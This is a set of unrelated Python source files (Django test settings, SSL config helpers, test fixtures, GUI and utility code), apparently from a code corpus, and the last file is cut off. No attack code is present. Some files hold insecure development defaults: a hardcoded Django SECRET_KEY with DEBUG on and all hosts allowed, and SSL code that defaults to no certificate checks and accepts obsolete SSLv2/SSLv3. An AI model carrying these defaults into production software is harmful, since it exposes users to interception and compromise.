{"text": "import os\n\nimport django\n\n\n# placeholder for gettext\ndef _(s):\n    return s\n\nBASE_DIR = os.path.dirname(os.path.dirname(__file__))\n\nSECRET_KEY = 'j#zwt2c!*(7(jz!m(tr$+jq^1d(+)e(^059f^nd_(*zj!gv0x)'\n\nDEBUG = True\n\nTEMPLATE_DEBUG = True\n\nALLOWED_HOSTS = ['*']\n\nINSTALLED_APPS = (\n    'modeltranslation',\n\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n\n    'debug_toolbar',\n\n    'celery',\n    'django_rq',\n\n    'app',\n\n    'mtr.utils'\n)\n\nMIDDLEWARE_CLASSES = (\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n)\n\nif django.get_version() >= '1.7':\n    MIDDLEWARE_CLASSES += (\n        'django.contrib.auth.middleware.SessionAuthenticationMiddleware',\n    )\nelse:\n    INSTALLED_APPS += (\n        'south',\n    )\n    SOUTH_MIGRATION_MODULES = {\n        'app': 'app.south_migrations',\n        'sync': 'mtr.sync.south_migrations',\n        'utils': 'mtr.utils.south_migrations',\n    }\n\nMIDDLEWARE_CLASSES += (\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n)\n\nif django.get_version() >= '1.8':\n    TEMPLATE_CONTEXT_PROCESSORS = (\n        \"django.contrib.auth.context_processors.auth\",\n        \"django.template.context_processors.debug\",\n        \"django.template.context_processors.i18n\",\n        \"django.template.context_processors.media\",\n        \"django.template.context_processors.static\",\n        \"django.template.context_processors.tz\",\n        'django.template.context_processors.request',\n        \"django.contrib.messages.context_processors.messages\",\n    )\nelse:\n    TEMPLATE_CONTEXT_PROCESSORS = (\n        \"django.contrib.auth.context_processors.auth\",\n        \"django.core.context_processors.debug\",\n        \"django.core.context_processors.i18n\",\n        \"django.core.context_processors.media\",\n        \"django.core.context_processors.static\",\n        \"django.core.context_processors.tz\",\n        'django.core.context_processors.request',\n        \"django.contrib.messages.context_processors.messages\",\n    )\n\nROOT_URLCONF = 'app.urls'\n\nWSGI_APPLICATION = 'app.wsgi.application'\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.path.join(BASE_DIR, 'olddb.sqlite3'),\n    }\n}\n\nif django.get_version() >= '1.7':\n    DATABASES['default']['NAME'] = os.path.join(BASE_DIR, 'db.sqlite3')\n\nLANGUAGE_CODE = 'en'\n\nLANGUAGES = (\n    ('de', _('German')),\n    ('en', _('English')),\n)\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\nSTATIC_URL = '/static/'\n\nMEDIA_URL = '/media/'\nMEDIA_ROOT = os.path.join(BASE_DIR, 'media')\n\nBROKER_BACKEND = 'memory'\n\nCELERY_ACCEPT_CONTENT = ['json']\nCELERY_TASK_SERIALIZER = 'json'\nCELERY_RESULT_SERIALIZER = 'json'\nCELERY_ALWAYS_EAGER = True\nCELERY_EAGER_PROPAGATES_EXCEPTIONS = True\n\nRQ_QUEUES = {\n    'default': {\n        'HOST': 'localhost',\n        'PORT': 6379,\n        'DB': 0,\n        'DEFAULT_TIMEOUT': 360,\n    },\n}\n"}
{"text": "# Copyright (c) 2020, Manfred Moitzi\n# License: MIT License\n\nimport pytest\nimport struct\nfrom ezdxf.tools.binarydata import ByteStream\n\n\ndef test_init():\n    bs = ByteStream(b'ABCDABC\\x00')\n    assert bs.index == 0\n    assert len(bs.buffer) == 8\n\n\ndef test_read_ps():\n    bs = ByteStream(b'ABCDABC\\x00')\n    s = bs.read_padded_string()\n    assert s == 'ABCDABC'\n    assert bs.index == 8\n    assert bs.has_data is False\n\n\ndef test_read_ps_align():\n    bs = ByteStream(b'ABCD\\x00')\n    s = bs.read_padded_string()\n    assert s == 'ABCD'\n    assert bs.index == 8\n    assert bs.has_data is False\n\n\ndef test_read_pus():\n    bs = ByteStream(b'A\\x00B\\x00C\\x00D\\x00\\x00\\x00')\n    s = bs.read_padded_unicode_string()\n    assert s == 'ABCD'\n    assert bs.index == 12\n    assert bs.has_data is False\n\n\ndef test_read_doubles():\n    data = struct.pack('3d', 1.0, 2.0, 3.0)\n    bs = ByteStream(data)\n    x = bs.read_struct('d')[0]\n    y = bs.read_struct('d')[0]\n    z = bs.read_struct('d')[0]\n    assert (x, y, z) == (1.0, 2.0, 3.0)\n    assert bs.index == 24\n    assert bs.has_data is False\n\n\nif __name__ == '__main__':\n    pytest.main([__file__])\n"}
{"text": "# Copyright 2013 IBM Corp.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport os\nimport ssl\n\nfrom oslo.config import cfg\n\nfrom messager.common.gettextutils import _\n\n\nssl_opts = [\n    cfg.StrOpt('ca_file',\n               default=None,\n               help=\"CA certificate file to use to verify \"\n                    \"connecting clients\"),\n    cfg.StrOpt('cert_file',\n               default=None,\n               help=\"Certificate file to use when starting \"\n                    \"the server securely\"),\n    cfg.StrOpt('key_file',\n               default=None,\n               help=\"Private key file to use when starting \"\n                    \"the server securely\"),\n]\n\n\nCONF = cfg.CONF\nCONF.register_opts(ssl_opts, \"ssl\")\n\n\ndef is_enabled():\n    cert_file = CONF.ssl.cert_file\n    key_file = CONF.ssl.key_file\n    ca_file = CONF.ssl.ca_file\n    use_ssl = cert_file or key_file\n\n    if cert_file and not os.path.exists(cert_file):\n        raise RuntimeError(_(\"Unable to find cert_file : %s\") % cert_file)\n\n    if ca_file and not os.path.exists(ca_file):\n        raise RuntimeError(_(\"Unable to find ca_file : %s\") % ca_file)\n\n    if key_file and not os.path.exists(key_file):\n        raise RuntimeError(_(\"Unable to find key_file : %s\") % key_file)\n\n    if use_ssl and (not cert_file or not key_file):\n        raise RuntimeError(_(\"When running server in SSL mode, you must \"\n                             \"specify both a cert_file and key_file \"\n                             \"option value in your configuration file\"))\n\n    return use_ssl\n\n\ndef wrap(sock):\n    ssl_kwargs = {\n        'server_side': True,\n        'certfile': CONF.ssl.cert_file,\n        'keyfile': CONF.ssl.key_file,\n        'cert_reqs': ssl.CERT_NONE,\n    }\n\n    if CONF.ssl.ca_file:\n        ssl_kwargs['ca_certs'] = CONF.ssl.ca_file\n        ssl_kwargs['cert_reqs'] = ssl.CERT_REQUIRED\n\n    return ssl.wrap_socket(sock, **ssl_kwargs)\n\n\n_SSL_PROTOCOLS = {\n    \"tlsv1\": ssl.PROTOCOL_TLSv1,\n    \"sslv23\": ssl.PROTOCOL_SSLv23,\n    \"sslv3\": ssl.PROTOCOL_SSLv3\n}\n\ntry:\n    _SSL_PROTOCOLS[\"sslv2\"] = ssl.PROTOCOL_SSLv2\nexcept AttributeError:\n    pass\n\n\ndef validate_ssl_version(version):\n    key = version.lower()\n    try:\n        return _SSL_PROTOCOLS[key]\n    except KeyError:\n        raise RuntimeError(_(\"Invalid SSL version : %s\") % version)\n"}
{"text": "#-\n# Copyright (c) 2013 Michael Roe\n# All rights reserved.\n#\n# This software was developed by SRI International and the University of\n# Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237\n# (\"CTSRD\"), as part of the DARPA CRASH research programme.\n#\n# @BERI_LICENSE_HEADER_START@\n#\n# Licensed to BERI Open Systems C.I.C. (BERI) under one or more contributor\n# license agreements.  See the NOTICE file distributed with this work for\n# additional information regarding copyright ownership.  BERI licenses this\n# file to you under the BERI Hardware-Software License, Version 1.0 (the\n# \"License\"); you may not use this file except in compliance with the\n# License.  You may obtain a copy of the License at:\n#\n#   http://www.beri-open-systems.org/legal/license-1-0.txt\n#\n# Unless required by applicable law or agreed to in writing, Work distributed\n# under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR\n# CONDITIONS OF ANY KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations under the License.\n#\n# @BERI_LICENSE_HEADER_END@\n#\n\nfrom beritest_tools import BaseBERITestCase\nfrom nose.plugins.attrib import attr\n\nclass test_fpu_x_underflow(BaseBERITestCase):\n\n    @attr('floatexception')\n    def test_fpu_x_underflow(self):\n        '''Test floating point underflow raises an exception'''\n\tself.assertRegisterEqual(self.MIPS.a2, 1, \"Floating point underflow did not raise an exception\")\n"}
{"text": "# -*- coding: UTF-8 -*-\n# Copyright 2015-2021 Rumma & Ko Ltd\n# License: BSD, see LICENSE for more details.\n\n# Usage:\n# $ go noi1e\n# $ python manage.py run tours/make.py\n# import time\nfrom pathlib import Path\n# from os.path import dirname\n# import traceback\nfrom django.conf import settings\nfrom django.utils import translation\nfrom lino.api import gettext as _  # not lazy\nfrom lino.api import rt\n\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\nfrom lino.api.selenium import Tour, runserver\n\n\ndef tour(app, user):\n    driver = app.driver\n\n    app.screenshot('login1', \"Before signing in\")\n\n    # note that \"Sign in\" button is in English even when user.language is\n    # something else because they haven't yet authenticated:\n    app.find_clickable(\"Sign in\").click()\n\n    elem = driver.find_element(By.NAME, 'username')\n    elem.send_keys(user.username)\n    elem = driver.find_element(By.NAME, 'password')\n    elem.send_keys(\"1234\")\n\n    app.screenshot('login2', \"The login window\")\n\n    elem.send_keys(Keys.RETURN)\n\n    app.screenshot('welcome', \"The main screen\")\n\n    app.find_clickable(_(\"Contacts\")).click()\n\n    app.screenshot('menu_contacts', \"The Contacts menu\")\n\n    app.find_clickable(_(\"Organizations\")).click()\n    # elem = driver.find_element(By.LINK_TEXT, _(\"Organizations\"))\n    # elem.click()\n\n    app.screenshot('contacts.Companies.grid', \"The list of organizations\")\n\n    # this worked on 20210206 but after a firefox upgrade it caused\n    # selenium.common.exceptions.ElementClickInterceptedException: Message: Element <button id=\"ext-gen103\" class=\" x-btn-text x-tbar-database_gear\" type=\"button\"> is not clickable at point (172,69) because another element <div id=\"ext-gen195\" class=\"ext-el-mask\"> obscures it\n    # and other problems.\n\n    wait = WebDriverWait(driver, 10)\n    elem = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, \"x-tbar-database_gear\")))\n\n    # app.stabilize()\n    # elem = driver.find_element(By.CLASS_NAME, \"x-tbar-database_gear\")\n    elem.click()\n    app.screenshot('contacts.Companies.grid.params', \"Filter parameters\")\n\n    # time.sleep(2)\n\n    # find the first row and doubleclick it:\n    app.stabilize()\n    found = False\n    for elem in driver.find_elements(By.CLASS_NAME, 'x-grid3-row'):\n        if app.is_stale(elem):\n            print(\"stale:\", elem)\n        else:\n            found = True\n            app.doubleclick(elem)\n            app.screenshot('contacts.Companies.detail', \"Detail window of an organization\")\n            app.find_clickable(_(\"Contact\")).click()\n            app.screenshot('contacts.Companies.detail2', \"Detail window of an organization (tab 2)\")\n            app.find_clickable(_(\"Sites\")).click()\n            app.screenshot('contacts.Companies.detail3', \"Detail window of an organization (tab 3)\")\n            break\n\n    if not found:\n        print(\"Mysterious: Did not find any row to doubleclick\")\n\n\n    # we can open the datail window programmatically using a permalink\n    if False:  # TODO: stabilize fails when there is no dashboard\n        obj  = rt.models.contacts.Person.objects.first()\n        ar = rt.login(user=user)\n        ba = obj.get_detail_action(ar)\n        url = ar.get_detail_url(ba.actor, obj.pk)\n        driver.get(app.server_url + url)\n        app.stabilize()\n        app.screenshot('contacts.Person.detail', \"Detail window of a person\")\n\n    # Log out before leaving so that the next user can enter\n\n    app.find_clickable(str(user)).click()\n    app.stabilize()\n    app.find_clickable(_(\"Sign out\")).click()\n\n\ndef main(a):\n    \"\"\"The function to call when the server is running.\"\"\"\n    for username in (\"robin\", \"rolf\"):\n        user = rt.models.users.User.objects.get(username=username)\n        a.set_language(user.language)\n        with translation.override(user.language):\n            tour(a, user)\n\n\nif __name__ == '__main__':\n    pth = Path(__file__).resolve().parents[3] / \"docs/specs/noi/tour\"\n    print(\"Writing screenshots to {}...\".format(pth))\n    pth.mkdir(exist_ok=True)\n    # pth.mkdir(exist_ok=True)\n    Tour(main, output_path=pth,\n        title=\"A tour of the Noi/ExtJS demo project\", ref=\"noi1e.tour\").make()\n"}
{"text": "# -*- coding: utf-8 -*-\n\n# Copyright (C) 2013-2014  Ivo Nunes/Vasco Nunes\n\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n\n\nfrom gi.repository import Gtk\nfrom birdieapp.signalobject import SignalObject\n\n\nclass StatusIcon(SignalObject):\n\n    def __init__(self):\n        super(StatusIcon, self).init_signals()\n\n        self.statusicon = Gtk.StatusIcon()\n        self.statusicon.set_from_icon_name(\"birdie\")\n        self.statusicon.connect(\"popup-menu\", self.right_click_event)\n        self.statusicon.connect(\"activate\", self.trayicon_activate)\n\n    def right_click_event(self, icon, button, tm):\n        menu = Gtk.Menu()\n\n        new_tweet = Gtk.MenuItem()\n        new_tweet.set_label(_(\"New Tweet\"))\n        new_tweet.connect(\"activate\", self.on_new_tweet)\n        menu.append(new_tweet)\n\n        quit_item = Gtk.MenuItem()\n        quit_item.set_label(_(\"Quit\"))\n        quit_item.connect(\"activate\", self.on_exit)\n        menu.append(quit_item)\n\n        menu.show_all()\n\n        menu.popup(None, None,\n                   lambda w, x: self.statusicon.position_menu(\n                   menu, self.statusicon),\n                   self.statusicon, 3, tm)\n\n    def trayicon_activate (self, widget, data = None):\n        \"\"\"Toggle status icon\"\"\"\n        self.emit_signal(\"toggle-window-visibility\")\n\n    def on_new_tweet(self, widget):\n        self.emit_signal_with_arg(\"new-tweet-compose\", None)\n\n    def on_exit(self, widget):\n        self.emit_signal_with_args(\"on-exit\", (None, None, None))\n\n"}
{"text": "import json\nimport os\nfrom os import path\nfrom typing import List\nimport jinja2\n\nfrom virgene.common_defs import SRC_DIR, TEMPLATES_DIR, FEATURES_DIR\nfrom virgene.config import Config\nfrom virgene.default_encoder import DefaultEncoder\nfrom virgene.feature_decoder import FeatureDecoder\n\n\nclass ConfigMgr:\n\n    def __init__(self):\n        self.jinja_env = jinja2.Environment(\n            loader=jinja2.FileSystemLoader(path.join(SRC_DIR, 'templates')),\n            keep_trailing_newline=True,\n            trim_blocks=True,\n            lstrip_blocks=True,\n            line_statement_prefix='%',\n            line_comment_prefix='##'\n        )\n        self.config = None\n\n    @staticmethod\n    def load_config_path(config_path) -> Config:\n        return Config.from_json(ConfigMgr.read_json_path(config_path))\n\n    @staticmethod\n    def read_json_path(json_path) -> json:\n        with open(json_path) as json_file:\n            return json.load(json_file)\n\n    # XXX this is convenient but not very good\n    def get_template(self, template_string_or_path) -> jinja2.Template:\n        if path.exists(path.join(TEMPLATES_DIR, template_string_or_path)):\n            template = self.jinja_env.get_template(template_string_or_path)\n        else:\n            template = jinja2.Template(template_string_or_path)\n        return template\n\n    def generate(self, config: Config) -> str:\n        \"\"\"\n        Receives a vimrc configuration object and return a string containing the\n        corresponding vimrc file content\n        :param config: Config\n        \"\"\"\n        snippets = []\n        plugins = []\n        plugin_configs = []\n        builtins = []\n\n        for feature in config.features:\n            if not feature.is_enabled():\n                continue\n            rendered_feature = feature.render(self.jinja_env)\n            if feature.feature_type == \"Snippet\":\n                snippets.append(rendered_feature)\n            if feature.feature_type == \"Plugin\":\n                plugins.append(feature)\n                plugin_configs.append(rendered_feature)\n            if feature.feature_type == \"Builtin\":\n                builtins.append(rendered_feature)\n\n        vimrc_template = self.jinja_env.get_template(\"vimrc_template.j2\")\n        return vimrc_template.render(snippets=snippets, plugins=plugins,\n                                     plugin_configurations=plugin_configs,\n                                     builtins=builtins)\n\n    @staticmethod\n    def build_default_config() -> Config:\n        installed_features = ConfigMgr.read_installed_features()\n        config = Config()\n        for feature in installed_features:\n            config.add_feature(feature)\n        return config\n\n    @staticmethod\n    def write_config(config: Config, output_path: [str, None]):\n        \"\"\"\n        Writes a Config object to file, or to stdout if output_path is None\n        :param config: vimrc configuration object\n        :param output_path: path to output file\n        :return:\n        \"\"\"\n        if output_path is None:\n            return json.dumps(config, cls=DefaultEncoder, indent=4)\n        else:\n            with open(output_path, 'w') as output_file:\n                output_file.write(\n                    json.dumps(config, cls=DefaultEncoder, indent=4))\n\n    @staticmethod\n    def write_default_config(output_path=None):\n        config = ConfigMgr.build_default_config()\n        ConfigMgr.write_config(config, output_path)\n\n    @staticmethod\n    def read_installed_features():\n        feature_paths = [path.join(FEATURES_DIR, x)\n                         for x in os.listdir(FEATURES_DIR)]\n        features = [FeatureDecoder.decode_from_path(x) for x in feature_paths]\n        return [x for x in features if x.installed]\n\n    def render_plugin_configs(self, plugin_jsons) -> List[str]:\n        \"\"\"\n        takes a list of plugin jsons and produces a list of generated templates,\n        one per plugin json\n        \"\"\"\n        templates = [self.jinja_env.get_template(x.template_path)\n                     for x in plugin_jsons]\n        return [template.render(plugin=plugin_json)\n                for template, plugin_json in zip(templates, plugin_jsons)]\n"}
{"text": "\"\"\"util.py: A collection of utility functions for source and/or client.\"\"\"\nimport base64\nimport hashlib\n\n\nclass Hashes(object):\n    \"\"\"Compute hash digests for ResourceSync.\n\n    These are all base64 encoded according to the rules of\n    http://www.ietf.org/rfc/rfc4648.txt\n\n    MD5\n\n    ResourceSync defined to be the same as for Content-MD5 in HTTP,\n    http://www.ietf.org/rfc/rfc2616.txt which, in turn, defined the\n    digest string as the \"base64 of 128 bit MD5 digest as per RFC 1864\"\n    http://www.ietf.org/rfc/rfc1864.txt\n\n    Unfortunately, RFC1864 is rather vague and contains only and example\n    which doesn't use encoding characters for 62 or 63. It points to\n    RFC1521 to describe base64 which is explicit that the encoding alphabet\n    is [A-Za-z0-9+/] with = to pad.\n\n    The above corresponds with the alphabet of \"3. Base 64 Encoding\" in RFC3548\n    http://www.ietf.org/rfc/rfc3548.txt\n    and not the url safe version, \"Base 64 Encoding with URL and Filename Safe\n    Alphabet\" which replaces + and / with - and _ respectively.\n\n    This is the same as the alphabet of \"4. Base 64 Encoding\" in RFC4648\n    http://www.ietf.org/rfc/rfc4648.txt.\n\n    This algorithm is implemented by base64.standard_b64encode() or\n    base64.b64encode() with no altchars specified. Available in python2.4 and\n    up [http://docs.python.org/library/base64.html]\n    \"\"\"\n\n    NAME_TO_ATTRIBUTE = {'md5': 'md5', 'sha-1': 'sha1', 'sha-256': 'sha256'}\n\n    def __init__(self, hashes=None, file=None):\n        \"\"\"Initialize Hashes object with types of hash to caluclate.\n\n        If file is supplied then compute for that file.\n        \"\"\"\n        self.hashes = set()\n        for hash in hashes:\n            if (hash not in self.NAME_TO_ATTRIBUTE.keys()):\n                raise Exception(\"Hash type %s not supported\" % (hash))\n            self.hashes.add(hash)\n        #\n        self.md5_calc = None\n        self.sha1_calc = None\n        self.sha256_calc = None\n        #\n        if (file is not None):\n            self.compute_for_file(file)\n\n    def initialize_hashes(self):\n        \"\"\"Create new hashlib objects for each hash we are going to calculate.\"\"\"\n        if ('md5' in self.hashes):\n            self.md5_calc = hashlib.md5()\n        if ('sha-1' in self.hashes):\n            self.sha1_calc = hashlib.sha1()\n        if ('sha-256' in self.hashes):\n            self.sha256_calc = hashlib.sha256()\n\n    def compute_for_file(self, file, block_size=2**14):\n        \"\"\"Compute hash digests for a file.\n\n        Calculate the hashes based on one read through the file.\n        Optional block_size parameter controls memory used to do\n        calculations. This should be a multiple of 128 bytes.\n        \"\"\"\n        self.initialize_hashes()\n        f = open(file, 'rb')\n        while True:\n            data = f.read(block_size)\n            if not data:\n                break\n            if self.md5_calc is not None:\n                self.md5_calc.update(data)\n            if self.sha1_calc is not None:\n                self.sha1_calc.update(data)\n            if self.sha256_calc is not None:\n                self.sha256_calc.update(data)\n        f.close()\n\n    def set(self, resource):\n        \"\"\"Set hash values for resource from current file.\n\n        Assumes that resource has appropriate attributes or setters\n        with names md5, sha1, etc. and that hashes have been calculated.\n        \"\"\"\n        for hash in self.hashes:\n            att = self.NAME_TO_ATTRIBUTE[hash]\n            setattr(resource, att, getattr(self, att))\n\n    @property\n    def md5(self):\n        \"\"\"Return MD5 hash calculated.\"\"\"\n        if (self.md5_calc is None):\n            return None\n        return self.md5_calc.hexdigest()\n\n    @property\n    def sha1(self):\n        \"\"\"Return SHA-1 hash calculated.\"\"\"\n        if (self.sha1_calc is None):\n            return None\n        return self.sha1_calc.hexdigest()\n\n    @property\n    def sha256(self):\n        \"\"\"Return SHA-256 hash calculated.\"\"\"\n        if (self.sha256_calc is None):\n            return None\n        return self.sha256_calc.hexdigest()\n"}
{"text": "# pylint:disable=abstract-method\nimport json\nimport os\nimport uuid\nfrom functools import partialmethod\n\nimport pytest\nfrom funcy import cached_property, retry\n\nfrom dvc.fs.gdrive import GDriveFileSystem\nfrom dvc.path_info import CloudURLInfo\nfrom dvc.utils import tmp_fname\n\nfrom .base import Base\n\nTEST_GDRIVE_REPO_BUCKET = \"root\"\n\n\ndef _gdrive_retry(func):\n    def should_retry(exc):\n        from googleapiclient.errors import HttpError\n\n        if not isinstance(exc, HttpError):\n            return False\n\n        if 500 <= exc.resp.status < 600:\n            return True\n\n        if exc.resp.status == 403:\n            try:\n                reason = json.loads(exc.content)[\"error\"][\"errors\"][0][\n                    \"reason\"\n                ]\n            except (ValueError, LookupError):\n                return False\n\n            return reason in [\"userRateLimitExceeded\", \"rateLimitExceeded\"]\n\n    # 16 tries, start at 0.5s, multiply by golden ratio, cap at 20s\n    return retry(\n        16,\n        timeout=lambda a: min(0.5 * 1.618 ** a, 20),\n        filter_errors=should_retry,\n    )(func)\n\n\nclass GDrive(Base, CloudURLInfo):\n    @staticmethod\n    def should_test():\n        return bool(os.getenv(GDriveFileSystem.GDRIVE_CREDENTIALS_DATA))\n\n    @cached_property\n    def config(self):\n        tmp_path = tmp_fname()\n        with open(tmp_path, \"w\") as stream:\n            raw_credentials = os.getenv(\n                GDriveFileSystem.GDRIVE_CREDENTIALS_DATA\n            )\n            try:\n                credentials = json.loads(raw_credentials)\n            except ValueError:\n                credentials = {}\n\n            use_service_account = credentials.get(\"type\") == \"service_account\"\n            stream.write(raw_credentials)\n\n        return {\n            \"url\": self.url,\n            \"gdrive_service_account_json_file_path\": tmp_path,\n            \"gdrive_use_service_account\": use_service_account,\n        }\n\n    @staticmethod\n    def _get_storagepath():\n        return TEST_GDRIVE_REPO_BUCKET + \"/\" + str(uuid.uuid4())\n\n    @staticmethod\n    def get_url():\n        # NOTE: `get_url` should always return new random url\n        return \"gdrive://\" + GDrive._get_storagepath()\n\n    @cached_property\n    def client(self):\n        try:\n            from gdrivefs import GoogleDriveFileSystem\n        except ImportError:\n            pytest.skip(\"gdrivefs is not installed\")\n\n        return GoogleDriveFileSystem(\n            token=\"cache\",\n            tokens_file=self.config[\"gdrive_service_account_json_file_path\"],\n            service_account=self.config[\"gdrive_use_service_account\"],\n        )\n\n    @_gdrive_retry\n    def mkdir(self, mode=0o777, parents=False, exist_ok=False):\n        if not self.client.exists(self.path):\n            self.client.mkdir(self.path)\n\n    @_gdrive_retry\n    def write_bytes(self, contents):\n        with self.client.open(self.path, mode=\"wb\") as stream:\n            stream.write(contents)\n\n    @_gdrive_retry\n    def _read(self, mode):\n        with self.client.open(self.path, mode=mode) as stream:\n            return stream.read()\n\n    read_text = partialmethod(_read, mode=\"r\")\n    read_bytes = partialmethod(_read, mode=\"rb\")\n\n\n@pytest.fixture\ndef gdrive(test_config, make_tmp_dir):\n    test_config.requires(\"gdrive\")\n    if not GDrive.should_test():\n        pytest.skip(\"no gdrive\")\n\n    # NOTE: temporary workaround\n    tmp_dir = make_tmp_dir(\"gdrive\", dvc=True)\n\n    ret = GDrive(GDrive.get_url())\n    fs = GDriveFileSystem(\n        gdrive_credentials_tmp_dir=tmp_dir.dvc.tmp_dir, **ret.config\n    )\n    fs._gdrive_create_dir(\"root\", fs.path_info.path)\n    yield ret\n"}
{"text": "import load_synth_extract\n\nfrom plants import studytreelist as plantslist\nfrom metazoa import studytreelist as metalist\nfrom fungi import studytreelist as fungilist\nfrom microbes import studytreelist as microbelist\n\nstudytreelist = []\nstudytreelist.extend(metalist)\nstudytreelist.extend(fungilist)\nstudytreelist.extend(microbelist)\nstudytreelist.extend(plantslist)\n\nif __name__ == \"__main__\":\n    from wopr_conf_TEMP import *\n    \n    synthottolid=\"93302\" # cellular organisms\n#    studytreelist = [\"420_522\"]\n#    studytreelist = [\"2460_5285\"] # Pyron Squamata study\n#    studytreelist = [\"2573_5959\"] # Sauria\n#    studytreelist = [\"2573_5959\"]\n#    from metazoa import studytreelist as metalist\n#    studytreelist = []\n#    studytreelist.extend(metalist)\n\n#    studytreelist = [\n#    \"1634_3303\", # Chiroptera. Agnarsson et al. 2011. PLoS Currents Tree of Life\n#    ]\n\n    print \"loading synthottolid:\",synthottolid\n    print \"loading studytreelist:\",studytreelist\n    \n    for i in studytreelist:\n        tstudy_list = [i]\n        generallogfileloc = \"synth_studies_submission/\"+i+\".log\"\n        ttfntreefn = \"synth_studies_submission/\"+i+\".tre\"\n        infmonofn = \"synth_studies_submission/\"+i+\".inf_mono\"\n        load_synth_extract.run_load_single_ttfn_inf_mono(dott,dload,studyloc,tstudy_list,javapre,\n                                                treemloc,generallogfileloc,dsynth,synthottolid,treefn,ttfntreefn,infmonofn)\n\n\n\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport click\nimport re\nfrom consolemsg import warn, step, error, u\nfrom datetime import datetime, timedelta\nfrom shutil import copyfile\nfrom pathlib import Path\nfrom slugify import slugify\n\n@click.command()\n@click.help_option()\n\n@click.option('-d', '--description',\n    help=\"Description tagline to add to the schedule\",\n)\n@click.option('--fromdate',\n    default=datetime.today().strftime(\"%Y-%m-%d\"),\n    help=\"Choose a monday for computing schedules. Format: YYYY-MM-DD\",\n)\n@click.option('--linenumber',\n     default=7,\n     help=\"Choose the numer of lines to attend calls\",\n)\ndef tomatic_sandbox(fromdate, description, linenumber):\n    try:\n        step(\"Generating graella sandbox for week {}\",fromdate)\n\n        fromdate = datetime.strptime(fromdate, '%Y-%m-%d')\n        if not fromdate.weekday() == 0:\n            fromdate = fromdate + timedelta(days=-fromdate.weekday(), weeks=1)\n        graellaFolder = fromdate.strftime(\"%Y-%m-%d\")\n        if description:\n            graellaFolder = '{}-{}'.format(graellaFolder, slugify(description))\n\n        step(\"Generating directory {}\", graellaFolder)\n        Path(graellaFolder).mkdir()\n        linkCertificate = Path(graellaFolder+'/drive-certificate.json')\n\n        step(\"Creating certificate link {}\", linkCertificate)\n        linkCertificate.symlink_to('../drive-certificate.json')\n\n        source = Path('config.yaml')\n        destination = Path(graellaFolder+'/config.yaml')\n        step(\"Creating file {}\", source)\n        copyfile(u(source), u(destination))\n\n        if linenumber:\n            step(\"Adding number of lines {} to file {}\", linenumber, source)\n            text = destination.read_text()\n            text2fix = re.compile(r'nTelefons: \\d+')\n            text = text.replace(text2fix.findall(text)[0], \"nTelefons: \"+str(linenumber))\n            destination.write_text(text)\n\n        source = Path('holidays.conf')\n        destination = Path(graellaFolder+'/holidays.conf')\n        step(\"Creating {} file\", source)\n        copyfile(u(source), u(destination))\n\n    except Exception as e:\n        error(e)\n        raise\n\nif __name__ == '__main__':\n   tomatic_sandbox()\n\n# vim: et ts=4 sw=4\n"}
{"text": "import ctypes\nimport ctypes.util\n\n__all__ = ('RegisterEventHotKey', 'EventHotKeyID')\n\nCarbon = ctypes.cdll.LoadLibrary(ctypes.util.find_library('Carbon'))\n\n# CFTypeRef CFRetain(CFTypeRef cf);\nCarbon.CFRetain.argtypes = [ctypes.c_void_p]\nCarbon.CFRetain.restype = ctypes.c_void_p\n\n# void CFRelease(CFTypeRef cf);\nCarbon.CFRelease.argtypes = [ctypes.c_void_p]\nCarbon.CFRelease.restype = None\n\n# typedef struct OpaqueEventTargetRef* EventTargetRef;\n#\n# extern EventTargetRef\n# GetApplicationEventTarget(void);\nCarbon.GetApplicationEventTarget.argtypes = []\nCarbon.GetApplicationEventTarget.restype = ctypes.c_void_p\n\n# typedef UInt32 FourCharCode;\n# typedef FourCharCode OSType;\n#\n# struct EventHotKeyID { OSType signature; UInt32 id; };\nclass EventHotKeyID(ctypes.Structure):\n    _fields_ = [('signature', ctypes.c_uint32), ('id', ctypes.c_uint32)]\n\n# typedef SInt32 OSStatus;\n#\n# extern OSStatus\n# RegisterEventHotKey(\n#   UInt32            inHotKeyCode,\n#   UInt32            inHotKeyModifiers,\n#   EventHotKeyID     inHotKeyID,\n#   EventTargetRef    inTarget,\n#   OptionBits        inOptions,\n#   EventHotKeyRef *  outRef);\n#\n# extern OSStatus\n# UnregisterEventHotKey(EventHotKeyRef inHotKey);\n\nCarbon.RegisterEventHotKey.argtypes = [\n\tctypes.c_uint32, ctypes.c_uint32, EventHotKeyID, ctypes.c_void_p,\n    ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]\nCarbon.RegisterEventHotKey.restype = 